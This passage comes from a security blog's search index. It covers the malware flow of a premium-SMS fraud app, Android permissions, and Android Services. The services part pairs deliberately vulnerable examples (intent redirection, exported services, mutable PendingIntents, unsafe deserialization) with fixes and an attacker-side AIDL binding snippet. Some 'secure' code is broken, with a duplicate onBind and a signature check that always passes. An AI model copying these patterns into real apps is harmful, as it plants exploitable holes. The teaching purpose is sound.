Carrier-Specific\\\\nPremium Number/Content] I --\u003e|No| K[Use Default\\\\nSMS Template] J --\u003e L[Build Deceptive UI] K --\u003e L L --\u003e M{User Clicks\\\\nDisguised Button?} M --\u003e|No| N[Redirect to\\\\nCameraActivity] M --\u003e|Yes| O{Android \u003c 6.0\\\\nMarshmallow} O --\u003e|Yes| P[Send SMS Immediately] O --\u003e|No| Q{Has SMS\\\\nPermission?} Q --\u003e|No| R[Request Permission\\\\nRepeatedly] Q --\u003e|Yes| P P --\u003e S[Split Message\\\\nif \u003e70 Characters] S --\u003e T[Send Premium SMS] T --\u003e U[Log Event to Firebase] U --\u003e V[Broadcast\\\\nSENT_HUGE_SMS_ACTION] V --\u003e D2 D2 --\u003e W{SMS Result Code} W --\u003e|Success -1| X[Report 'yes'\\\\nto C\u0026C Server] W --\u003e|Failure 0-4| Y[Report Error Code\\\\nto C\u0026C] X --\u003e Z[Trigger\\\\nLoading.ACTION_START] Z --\u003e AA[Mark Preference\\\\n'videoShare=yes'] AA --\u003e AB[Open CameraActivity\\\\nas Diversion] Resources # The Hacker News: Over 10 Million Android Users Targeted With Premium SMS Scam Apps Avast Blog: Premium SMS Scam Apps on Play Store NIST Mobile Threat Catalogue: APP-16 Microsoft Security Blog: Toll fraud malware SecureWorks: Stels Android Trojan Malware Analysis Medium: Analysis of Joker ‚Äî A Spy \u0026amp; Premium Subscription Bot on GooglePlay ResearchGate: Android SMS Malware: Vulnerability and Mitigation ","date":"10 ÿ£ÿ∫ÿ≥ÿ∑ÿ≥ 2025","externalUrl":null,"permalink":"/superBLog/posts/malware/mobile/thicamera/","section":"","summary":"","title":"Premium SMS Fraud - ThaiCamera analysis","type":"posts"},{"content":"","date":"10 ÿ£ÿ∫ÿ≥ÿ∑ÿ≥ 2025","externalUrl":null,"permalink":"/superBLog/tags/sms-fraud/","section":"Tags","summary":"","title":"Sms Fraud","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/tags/0/","section":"Tags","summary":"","title":"0","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/andorid/","section":"Tags","summary":"","title":"Andorid","type":"tags"},{"content":" 1. Android Sandboxing # Android uses application sandboxing through user-based isolation. The system operates on a principle of least privilege where each application has its own unique Linux user ID (UID), and must explicitly request access to protected resources. Preventing applications from accessing each other\u0026rsquo;s data without explicit permissions.\nUser ID Implementation: # User Type UID Range Example Storage Location System Users 1000-9999 System (1000), Radio (1001) Defined in kernel (android_filesystem_config.h) Application Users Starting at 10000 User application (e.g., 10129) Tracked in /data/system/packages.xml Example filesystem representation:\n/data/data/u0_a129/ (where \u0026lsquo;a129\u0026rsquo; represents UID 10129) 2. Permission Storage and Management # Android permissions are defined and stored in multiple locations:\nSystem Permission Files: # File Location Purpose Contents /etc/permissions/platform.xml Defines core system permissions System UID-permission mappings /data/system/packages.xml Tracks installed apps\u0026rsquo; permissions App UIDs, granted permissions, certificates Example from packages.xml:\n\u0026lt;package name=\u0026#34;com.apphacking.privacy\u0026#34; codePath=\u0026#34;...\u0026#34; nativeLibraryPath=\u0026#34;...\u0026#34;\u0026gt; \u0026lt;userId\u0026gt;10129\u0026lt;/userId\u0026gt; \u0026lt;cert\u0026gt;...\u0026lt;/cert\u0026gt; \u0026lt;perms\u0026gt; \u0026lt;item name=\u0026#34;android.permission.READ_CONTACTS\u0026#34; granted=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;item name=\u0026#34;android.permission.INTERNET\u0026#34; granted=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/perms\u0026gt; \u0026lt;/package\u0026gt; 3. Permission Types # By Source (who gave it) # Permission Source Definition Example System Permissions Pre-defined by Android android.permission.READ_CONTACTS Custom Permissions Defined by applications com.apphacking.privacy.USER_INFO By Grant Time (when permission is applied) # 3.1 Install-time Permissions # Automatically granted when app is installed - minimal risk to privacy/security.\nNormal Permissions:\nCover low-risk operations Granted at installation without user interaction Examples: INTERNET, VIBRATE Signature Permissions:\nGranted only to apps signed with same developer certificate Used for secure communication between same-developer apps Example: Data sharing between messaging and calendar apps from same developer 3.2 Runtime Permissions (Dangerous) # Introduced in Android 6.0 (API level 23) - protect sensitive user data.\nKey Characteristics:\nRequire explicit user approval during app use Can be granted or denied by users Apps must handle denials gracefully Examples:\nandroid.permission.CAMERA android.permission.ACCESS_FINE_LOCATION android.permission.READ_CONTACTS 3.3 Special Permissions # Allow access to powerful system features via \u0026ldquo;Special app access\u0026rdquo; settings.\nExamples:\nandroid.permission.SYSTEM_ALERT_WINDOW - Draw over other apps android.permission.WRITE_SETTINGS - Modify system settings 4. Protection Levels # Protection Level Description User Experience Risk Level normal Lower-risk permissions for isolated features Automatically granted at installation Low dangerous Higher-risk permissions accessing private data Explicit user consent required at runtime Medium-High signature Only granted to apps with matching certificate Silently granted if certificate matches High knownSigner Only granted to apps with allowed certificate Silently granted if certificate listed High signature|privileged For matching signature OR privileged system apps Silently granted for system apps Very High [!note] signatureOrSystem is deprecated since API level 23 (Android 6.0). It was previously used to grant permissions to apps that were either signed with the same certificate as the system or were pre-installed system apps.\n6. Using Permissions # 6.1 Declaring Permissions # Permissions are declared in AndroidManifest.xml using the \u0026lt;uses-permission\u0026gt; tag.\nBasic Declaration:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.CAMERA\u0026#34; /\u0026gt; Version-Specific Declaration:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.READ_EXTERNAL_STORAGE\u0026#34; android:maxSdkVersion=\u0026#34;28\u0026#34; /\u0026gt; 6.2 Checking Permission Status (if the app has it or not) # import androidx.core.content.ContextCompat; import android.content.pm.PackageManager; if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) { // Permission is granted, proceed with camera access } else { // Permission is not granted, request it } 6.3 Requesting Runtime Permissions # Modern Approach (ActivityResultLauncher) # Single Permission:\nimport androidx.activity.result.ActivityResultLauncher; import androidx.activity.result.contract.ActivityResultContracts; private ActivityResultLauncher\u0026lt;String\u0026gt; requestPermissionLauncher = registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -\u0026gt; { if (isGranted) { // Permission granted, proceed with the action } else { // Permission denied, handle accordingly } }); // Request permission when needed if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { requestPermissionLauncher.launch(Manifest.permission.CAMERA); } Multiple Permissions:\nprivate ActivityResultLauncher\u0026lt;String[]\u0026gt; requestMultiplePermissionsLauncher = registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), permissions -\u0026gt; { permissions.forEach((permission, isGranted) -\u0026gt; { if (isGranted) { // Permission granted } else { // Permission denied } }); }); requestMultiplePermissionsLauncher.launch(new String[]{ Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION }); Legacy Approach (requestPermissions) # Request:\nimport androidx.core.app.ActivityCompat; ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1); Handle Result:\n@Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) { super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1) { if (grantResults.length \u0026gt; 0 \u0026amp;\u0026amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) { // Permission granted } else { // Permission denied } } } 7. Creating Custom Permissions # 7.1 Defining Custom Permissions # Custom permissions are defined in AndroidManifest.xml using the \u0026lt;permission\u0026gt; tag:\n\u0026lt;permission android:name=\u0026#34;com.example.myapp.permission.CUSTOM_PERMISSION\u0026#34; android:protectionLevel=\u0026#34;dangerous\u0026#34; android:label=\u0026#34;@string/permission_label\u0026#34; android:description=\u0026#34;@string/permission_description\u0026#34; android:permissionGroup=\u0026#34;android.permission-group.STORAGE\u0026#34; /\u0026gt; String Resources (res/values/strings.xml):\n\u0026lt;string name=\u0026#34;permission_label\u0026#34;\u0026gt;Access Custom Data\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;permission_description\u0026#34;\u0026gt;Allows the app to access custom app data.\u0026lt;/string\u0026gt; or Directly:\n\u0026lt;permission android:label=\u0026#34;Allows reading user information\u0026#34; android:name=\u0026#34;com.apphacking.privacy.USER_INFO\u0026#34; android:protectionLevel=\u0026#34;dangerous\u0026#34;/\u0026gt; 7.2 Requesting Custom Permissions # Other apps request custom permissions like standard permissions:\n\u0026lt;uses-permission android:name=\u0026#34;com.example.myapp.permission.CUSTOM_PERMISSION\u0026#34; /\u0026gt; [!note] If custom permission has dangerous protection level, it must be requested at runtime\n8. Permission Request Process # Permission Request Flow: # Developer declares needed permissions in AndroidManifest.xml At installation/runtime, system processes these requests For dangerous permissions, system prompts user for approval If granted, permission is recorded in packages.xml Application can now access the protected functionality Technical Implementation: # App\u0026rsquo;s UID is added to the group that has the requested permission This grants the Linux-level access needed for the permission System tracks granted state in packages.xml References # Android Permissions Overview Requesting Runtime Permissions Defining Custom Permissions Android Core AndroidManifest.xml App Permissions Best Practices https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/ ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/permissions/","section":"","summary":"","title":"Android Permissions","type":"posts"},{"content":" Summary # Android Services are application components designed to perform long-running operations in the background without providing a user interface. They enable apps to continue executing tasks even when users switch to other applications or when the app is closed.\n[!Who can use Services?]\nActivities: Can start and bind to services for background operations Other Services: Services can communicate with each other Broadcast Receivers: Can trigger service operations based on system events Content Providers: Can use services for data synchronization System Components: Android system can restart services based on configuration External Apps: Through proper permissions and exported services What Services Look Like # Key Components of a Service # A Service consists of several lifecycle methods and configuration options:\npublic class ExampleService extends Service { private MediaPlayer player; private final IBinder binder = new LocalBinder(); // Lifecycle callbacks @Override public void onCreate() { super.onCreate(); // One-time setup } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Handle start requests return START_STICKY; // or START_NOT_STICKY, START_REDELIVER_INTENT } @Override public IBinder onBind(Intent intent) { return binder; // Return IBinder for bound services } @Override public boolean onUnbind(Intent intent) { return super.onUnbind(intent); } @Override public void onRebind(Intent intent) { super.onRebind(intent); } @Override public void onDestroy() { super.onDestroy(); // Cleanup resources } } [!Warning] Threading Considerations Services run on the main thread by default. For intensive operations, create separate threads to avoid ANR (Application Not Responding) errors.\nJob Service # A very common service you might see exposed is an Android Job Scheduler service. However due to the android.permission.BIND_JOB_SERVICE permission this service cannot be directly interacted with and can usually be ignored when hunting for bugs.\nAndroidManifest.xml # \u0026lt;service android:name=\u0026#34;.MyJobService\u0026#34; android:permission=\u0026#34;android.permission.BIND_JOB_SERVICE\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/service\u0026gt; ![[jobService.png]]\nTypes of Services # 1. Started Services (Unbound) # Services that run independently after being started when bound method returns nothing or throws an exception\nLifecycle: Started with startService(), runs indefinitely until stopped Use Cases: Music playback, file downloads, data synchronization etc\u0026hellip; Stopping: Must be explicitly stopped with stopSelf() or stopService() ex:\npublic class MusicService extends Service { private MediaPlayer player; @Override public int onStartCommand(Intent intent, int flags, int startId) { player = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI); player.setLooping(true); player.start(); return START_STICKY; // Restart if killed by system } @Override public void onDestroy() { super.onDestroy(); if (player != null) { player.stop(); player.release(); } } @Override public IBinder onBind(Intent intent) { return null; // Not providing binding } } Starting from Activity:\n// Start service Intent serviceIntent = new Intent(this, MusicService.class); startService(serviceIntent); // Stop service stopService(new Intent(this, MusicService.class)); Return Flags for onStartCommand() # Flag Behavior START_NOT_STICKY Don\u0026rsquo;t recreate service if killed START_STICKY Recreate service but don\u0026rsquo;t redeliver intent START_REDELIVER_INTENT Recreate service and redeliver last intent 2. Bound Services # Services that provide client-server interface for interaction\nThey get started to execute something in the background, and so called bound Services where an app can establish a connection and continuously exchange data with the other app. SO using onstartcommand is like a one way communication but now we can send \u0026amp; receive data\nLifecycle: Lives as long as components are bound to it Use Cases: IPC, data sharing, remote method calls Communication: Through IBinder interface Binding Methods # [!error] When talking to bound services with bindService() you will need to send an intent but also you will need to setup a ServiceConnection and pass it in bindService(intent,ServiceConnection)\nprivate ServiceConnection connection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName className, IBinder service) { } @Override public void onServiceDisconnected(ComponentName arg0) { } }; A. Extending Binder Class (Local Services) # [!note] we as attackers can\u0026rsquo;t bind to this service since only components inside app are allowed to bind to it and no one else\nBest for same-process communication\npublic class LocalService extends Service { private final IBinder binder = new LocalBinder(); public class LocalBinder extends Binder { LocalService getService() { return LocalService.this; } } @Override public IBinder onBind(Intent intent) { return binder; } } Client Activity:\npublic class BindingActivity extends Activity { LocalService mService; boolean mBound = false; private ServiceConnection connection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName className, IBinder service) { LocalService.LocalBinder binder = (LocalService.LocalBinder) service; mService = binder.getService(); mBound = true; } @Override public void onServiceDisconnected(ComponentName arg0) { mBound = false; } }; @Override protected void onStart() { super.onStart(); Intent intent = new Intent(this, LocalService.class); bindService(intent, connection, Context.BIND_AUTO_CREATE); } @Override protected void onStop() { super.onStop(); if (mBound) { unbindService(connection); mBound = false; } } } B. Using Messenger (Cross-Process) # Best for simple IPC without thread safety concerns\n[!info] A messenger service can easily be recognised by looking at the onBind() method that returns a IBinder object created from the Messenger class.\n[!note] The inline class extending Handler is contains a handleMessage() method that implements the actual service logic. The attacker can control the Message coming in.\npublic class MessengerService extends Service { static final int MSG_SAY_HELLO = 1; static class IncomingHandler extends Handler { private Context applicationContext; IncomingHandler(Context context) { applicationContext = context.getApplicationContext(); } @Override public void handleMessage(Message msg) { switch (msg.what) { case MSG_SAY_HELLO: Toast.makeText(applicationContext, \u0026#34;Hello!\u0026#34;, Toast.LENGTH_SHORT).show(); break; default: super.handleMessage(msg); } } } Messenger mMessenger; @Override public IBinder onBind(Intent intent) { mMessenger = new Messenger(new IncomingHandler(this)); return mMessenger.getBinder(); } } Client using Messenger:\npublic class ActivityMessenger extends Activity { Messenger mService = null; boolean bound; private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { mService = new Messenger(service); bound = true; } public void onServiceDisconnected(ComponentName className) { mService = null; bound = false; } }; public void sayHello(View v) { if (!bound) return; Message msg = Message.obtain(null, MessengerService.MSG_SAY_HELLO, 0, 0); try { mService.send(msg); } catch (RemoteException e) { e.printStackTrace(); } } } using looper\n```java public class MyMessageService extends Service { public static final int MSG_SUCCESS = 42; final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper())); @Override // android.app.Service public IBinder onBind(Intent intent) { return this.messenger.getBinder(); } class IncomingHandler extends Handler { IncomingHandler(Looper looper) { super(looper); } @Override // android.os.Handler public void handleMessage(Message message) { if (message.what == 42) { // ... } else { super.handleMessage(message); } } } } A Looper is just a message pump that Runs an infinite loop on a thread to Pull messages from a MessageQueue then Dispatches/send them to the appropriate Handler and Keeps the thread alive to process messages\nC. Using AIDL (Android Interface Definition Language) # Best for complex multi-threaded IPC\nStep 1: Create AIDL file (IRemoteService.aidl):\nTo add aidl files you need to set it up in the the gradle build file and search for buildFeatures and if you cannot find this block, create it and set aidl to true\nbuildFeatures { aidl true } // IRemoteService.aidl package com.example.android; interface IRemoteService { int getPid(); void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString); } Step 2: Implement Service:\npublic class RemoteService extends Service { @Override public IBinder onBind(Intent intent) { return binder; } private final IRemoteService.Stub binder = new IRemoteService.Stub() { public int getPid() { return Process.myPid(); } public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) { // Implementation } }; } Step 3: Client Implementation:\nIRemoteService iRemoteService; private ServiceConnection mConnection = new ServiceConnection() { public void onServiceConnected(ComponentName className, IBinder service) { iRemoteService = IRemoteService.Stub.asInterface(service); } public void onServiceDisconnected(ComponentName className) { iRemoteService = null; } }; 2. if the aidl already defined but in different app # 1- if you will use this file to talk to service of a different app you need to set the name exactly as in the service , then\nright click on aidl folder and create a new package with the name in DESCRIPTOR click on the aidl file you created then choose refactor, move it in the folder you have ejus created in the file you are in change the package name from your app to the one in DESCRIPTOR rebuild the app 2- using class Loading By loading the class directly from the target app, we can just invoke the functions we need and do not have to bother about method order or package names.\nServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;package.name\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;class.you.want.to.use\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); //Example to create and call method from class Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;openFlag\u0026#34;); boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Reversing # When you see .Stub() related code inside a Service implementation, we probably have an AIDL service. To reverse engineer the original .aidl code, we can look into the generated service interface code.\nLook for the DESCRIPTOR variable, as it contains the original package path and .aidl filename The AIDL methods can be derived from the interface methods with the throws RemoteException The original method order is shown by the TRANSACTION_ integers 3. Foreground Services # Services that perform user-noticeable operations with persistent notifications\npublic class ForegroundService extends Service { private static final int NOTIFICATION_ID = 1; private static final String CHANNEL_ID = \u0026#34;ForegroundServiceChannel\u0026#34;; @Override public void onCreate() { super.onCreate(); createNotificationChannel(); } @Override public int onStartCommand(Intent intent, int flags, int startId) { createNotificationChannel(); Intent notificationIntent = new Intent(this, MainActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE); Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID) .setContentTitle(\u0026#34;Foreground Service\u0026#34;) .setContentText(\u0026#34;Service is running...\u0026#34;) .setSmallIcon(R.drawable.ic_notification) .setContentIntent(pendingIntent) .build(); startForeground(NOTIFICATION_ID, notification); return START_NOT_STICKY; } private void createNotificationChannel() { if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { NotificationChannel serviceChannel = new NotificationChannel( CHANNEL_ID, \u0026#34;Foreground Service Channel\u0026#34;, NotificationManager.IMPORTANCE_DEFAULT ); NotificationManager manager = getSystemService(NotificationManager.class); manager.createNotificationChannel(serviceChannel); } } @Override public IBinder onBind(Intent intent) { return null; } } Starting Foreground Service:\n// For API 26+ if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { startForegroundService(new Intent(this, ForegroundService.class)); } else { startService(new Intent(this, ForegroundService.class)); } Service Security Vulnerabilities \u0026amp; Attacks # 1. Intent Redirection Attacks # [!danger] Critical Vulnerability A publicly accessible service might receive an Intent object as an extra and then use unsafe methods like startActivity(), sendBroadcast(), or startService() on that embedded Intent. This is similar to an Open Redirect in web security.\nAttack Scenario: An attacker can craft a malicious Intent containing a target Intent for a normally non-exported component within the vulnerable app. The proxy service then unknowingly forwards this malicious Intent, bypassing Android\u0026rsquo;s access restrictions.\nImpact:\nTheft of authentication details (user session) Forging of content within the app Arbitrary code execution by rewriting files and substituting native libraries Access to Content Providers with android:grantUriPermissions=\u0026quot;true\u0026quot; Vulnerable Code Example:\npublic class VulnerableProxyService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { // DANGEROUS: Directly forwarding received intent Intent embeddedIntent = intent.getParcelableExtra(\u0026#34;target_intent\u0026#34;); if (embeddedIntent != null) { startActivity(embeddedIntent); // Bypasses access controls! } return START_NOT_STICKY; } @Override public IBinder onBind(Intent intent) { return null; } } Secure Implementation:\npublic class SecureProxyService extends Service { private static final String[] ALLOWED_ACTIONS = { Intent.ACTION_VIEW, Intent.ACTION_SEND }; @Override public int onStartCommand(Intent intent, int flags, int startId) { // Extract only necessary and safe data String action = intent.getStringExtra(\u0026#34;safe_action\u0026#34;); String data = intent.getStringExtra(\u0026#34;safe_data\u0026#34;); if (!isAllowedAction(action) || !isSafeData(data)) { Log.w(TAG, \u0026#34;Unsafe intent parameters detected\u0026#34;); return START_NOT_STICKY; } // Create new intent with validated data only Intent safeIntent = new Intent(action); safeIntent.setData(Uri.parse(data)); // Remove unsafe flags safeIntent.setFlags(0); // Add only necessary safe flags safeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(safeIntent); return START_NOT_STICKY; } private boolean isAllowedAction(String action) { return action != null \u0026amp;\u0026amp; Arrays.asList(ALLOWED_ACTIONS).contains(action); } private boolean isSafeData(String data) { if (data == null) return false; try { Uri uri = Uri.parse(data); String scheme = uri.getScheme(); return \u0026#34;https\u0026#34;.equals(scheme) || \u0026#34;http\u0026#34;.equals(scheme); } catch (Exception e) { return false; } } @Override public IBinder onBind(Intent intent) { return null; } } 2. Improper Platform Usage and Permission-Based Access Control # [!danger] Permission Bypass An exported service performing sensitive tasks might lack proper android:permission or manual permission checks, allowing malicious apps to abuse the service\u0026rsquo;s privileges.\nVulnerable Manifest:\n\u0026lt;!-- DANGEROUS: Exported without permission checks --\u0026gt; \u0026lt;service android:name=\u0026#34;.SensitiveService\u0026#34; android:exported=\u0026#34;true\u0026#34; /\u0026gt; Secure Manifest Configuration:\n\u0026lt;!-- Secure service configuration --\u0026gt; \u0026lt;service android:name=\u0026#34;.SecureService\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; /\u0026gt; \u0026lt;!-- Define custom signature-level permission --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; android:label=\u0026#34;Access Secure Service\u0026#34; android:description=\u0026#34;Allows access to secure service functionality\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; Secure Service Implementation:\npublic class SecureService extends Service { private static final String REQUIRED_PERMISSION = \u0026#34;com.example.CUSTOM_PERMISSION\u0026#34;; private static final String[] TRUSTED_PACKAGES = { \u0026#34;com.example.trustedapp1\u0026#34;, \u0026#34;com.example.trustedapp2\u0026#34; }; @Override public IBinder onBind(Intent intent) { // Check calling permission if (checkCallingPermission(REQUIRED_PERMISSION) != PackageManager.PERMISSION_GRANTED) { throw new SecurityException(\u0026#34;Permission denied: \u0026#34; + REQUIRED_PERMISSION); } // Additional package validation if (!isCallerTrusted()) { throw new SecurityException(\u0026#34;Untrusted caller\u0026#34;); } return binder; } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Validate calling package if (!isCallerTrusted()) { Log.w(TAG, \u0026#34;Unauthorized access attempt from: \u0026#34; + getCallingPackage()); stopSelf(); return START_NOT_STICKY; } // Perform sensitive operations performSensitiveTask(); return START_STICKY; } private boolean isCallerTrusted() { String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); // Verify package signature for additional security if (callingPackage != null) { try { PackageInfo callerInfo = getPackageManager() .getPackageInfo(callingPackage, PackageManager.GET_SIGNATURES); return verifySignature(callerInfo.signatures); } catch (PackageManager.NameNotFoundException e) { return false; } } return Arrays.asList(TRUSTED_PACKAGES).contains(callingPackage); } private boolean verifySignature(Signature[] signatures) { // Implement signature verification logic // Compare with expected signature hashes return true; // Simplified for brevity } @Override public IBinder onBind(Intent intent) { return null; } } 3. Implicit Intent Hijacking # [!danger] Intent Interception Malicious applications can intercept implicit intents meant for legitimate services by registering matching intent filters.\nVulnerable Code:\n// DANGEROUS: Using implicit intent Intent serviceIntent = new Intent(\u0026#34;com.example.ACTION_PROCESS_DATA\u0026#34;); serviceIntent.putExtra(\u0026#34;sensitive_token\u0026#34;, userToken); startService(serviceIntent); Secure Implementation:\npublic class SecureIntentService extends Service { // Start service securely from client public static void startSecurely(Context context, String data) { Intent explicit = new Intent(context, SecureIntentService.class); // Make intent explicit explicit.setPackage(context.getPackageName()); explicit.putExtra(\u0026#34;data\u0026#34;, data); if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { context.startForegroundService(explicit); } else { context.startService(explicit); } } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Validate intent source if (!isIntentFromTrustedSource(intent)) { Log.w(TAG, \u0026#34;Received intent from untrusted source\u0026#34;); stopSelf(); return START_NOT_STICKY; } String data = intent.getStringExtra(\u0026#34;data\u0026#34;); if (data != null) { processData(data); } return START_NOT_STICKY; } private boolean isIntentFromTrustedSource(Intent intent) { String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); return getPackageName().equals(callingPackage); } @Override public IBinder onBind(Intent intent) { return null; } } 4. Pending Intent Vulnerabilities # [!danger] Mutable PendingIntents Mutable PendingIntent objects can be modified by malicious applications to gain access to non-exported components.\nVulnerable PendingIntent Creation:\n// DANGEROUS: Mutable PendingIntent Intent intent = new Intent(this, PrivateActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity( this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT); Secure PendingIntent Implementation:\npublic class SecurePendingIntentService extends Service { private PendingIntent createSecurePendingIntent() { Intent intent = new Intent(this, MainActivity.class); intent.setAction(\u0026#34;com.example.SECURE_ACTION\u0026#34;); // Make PendingIntent immutable (API 23+) int flags = PendingIntent.FLAG_UPDATE_CURRENT; if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.M) { flags |= PendingIntent.FLAG_IMMUTABLE; } // Use FLAG_ONE_SHOT if should only be triggered once if (shouldBeOneShot()) { flags |= PendingIntent.FLAG_ONE_SHOT; } return PendingIntent.getActivity(this, 0, intent, flags); } private void handlePendingIntent(PendingIntent receivedIntent) { // NEVER trust PendingIntent creator information for authorization // DO NOT use: PendingIntent.getCreatorPackage() // DO NOT use: PendingIntent.getCreatorUid() // Instead, use alternative authentication methods String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); if (!isAuthorizedCaller(callingPackage)) { throw new SecurityException(\u0026#34;Unauthorized PendingIntent usage\u0026#34;); } // Process the PendingIntent safely try { receivedIntent.send(); } catch (PendingIntent.CanceledException e) { Log.e(TAG, \u0026#34;PendingIntent was cancelled\u0026#34;, e); } } private boolean shouldBeOneShot() { // Determine if this PendingIntent should only be used once return true; } private boolean isAuthorizedCaller(String packageName) { // Verify caller through alternative means return verifyCallerSignature(packageName); } @Override public IBinder onBind(Intent intent) { return null; } } 5. Memory Corruption Vulnerabilities # [!danger] Deserialization Attacks Services processing untrusted data through deserialization or insecure JSON parsing can be vulnerable to memory corruption.\nVulnerable Code:\n// DANGEROUS: Unsafe deserialization @Override public int onStartCommand(Intent intent, int flags, int startId) { byte[] serializedData = intent.getByteArrayExtra(\u0026#34;user_data\u0026#34;); if (serializedData != null) { try { ObjectInputStream ois = new ObjectInputStream( new ByteArrayInputStream(serializedData)); Object userObject = ois.readObject(); // DANGEROUS! processUserObject(userObject); } catch (Exception e) { Log.e(TAG, \u0026#34;Deserialization failed\u0026#34;, e); } } return START_NOT_STICKY; } Secure Implementation:\npublic class SecureDeserializationService extends Service { private static final Set\u0026lt;String\u0026gt; ALLOWED_CLASSES = new HashSet\u0026lt;\u0026gt;(Arrays.asList( \u0026#34;com.example.SafeDataClass\u0026#34;, \u0026#34;com.example.UserPreferences\u0026#34; )); @Override public int onStartCommand(Intent intent, int flags, int startId) { String jsonData = intent.getStringExtra(\u0026#34;json_data\u0026#34;); if (jsonData != null) { processJsonSafely(jsonData); } Bundle bundle = intent.getBundleExtra(\u0026#34;bundle_data\u0026#34;); if (bundle != null) { processBundleSafely(bundle); } return START_NOT_STICKY; } private void processJsonSafely(String jsonData) { try { // Use safe JSON parsing - avoid dynamic object creation JSONObject json = new JSONObject(jsonData); // Extract only expected fields String name = json.optString(\u0026#34;name\u0026#34;, \u0026#34;\u0026#34;); int age = json.optInt(\u0026#34;age\u0026#34;, 0); if (isValidInput(name, age)) { // Create objects manually instead of automatic deserialization UserData userData = new UserData(name, age); processUserData(userData); } } catch (JSONException e) { Log.w(TAG, \u0026#34;Invalid JSON data received\u0026#34;); } } private void processBundleSafely(Bundle bundle) { // Avoid using Parcelable classes that might contain native pointers // Extract primitive types only String safeString = bundle.getString(\u0026#34;safe_string\u0026#34;); int safeInt = bundle.getInt(\u0026#34;safe_int\u0026#34;, 0); if (isValidBundleData(safeString, safeInt)) { processValidatedData(safeString, safeInt); } } private boolean isValidInput(String name, int age) { return name != null \u0026amp;\u0026amp; name.length() \u0026lt;= 100 \u0026amp;\u0026amp; age \u0026gt;= 0 \u0026amp;\u0026amp; age \u0026lt;= 150; } private boolean isValidBundleData(String str, int value) { return str != null \u0026amp;\u0026amp; str.length() \u0026lt;= 1000 \u0026amp;\u0026amp; value \u0026gt;= 0; } // Custom ObjectInputStream with class filtering private static class SafeObjectInputStream extends ObjectInputStream { public SafeObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); 